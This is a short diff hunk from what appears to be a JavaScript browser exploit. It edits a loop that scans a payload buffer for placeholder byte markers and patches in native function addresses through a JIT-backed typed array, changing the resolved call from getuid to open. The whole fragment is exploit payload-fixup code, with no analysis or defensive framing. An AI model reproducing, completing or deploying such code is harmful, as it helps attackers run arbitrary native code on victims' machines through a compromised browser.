@@ -172,7 +172,7 @@ for(var i=0;i<g_ld_data.length;i++){
   start_offset=i;
  }
  if(i<g_ld_data.length-3 && g_ld_data[i]==0x11 && g_ld_data[i+1]==0x11 &&g_ld_data[i+2]==0x11&&g_ld_data[i+3]==0x11){
-  myarr[0]=getuid_addr;
+  myarr[0]=open_addr;
   typedarray[jit_index]+=4;
   i+=3;
  }else if(i<g_ld_data.length-3 && g_ld_data[i]==0x22 && g_ld_data[i+1]==0x22 &&g_ld_data[i+2]==0x22&&g_ld_data[i+3]==0x22){
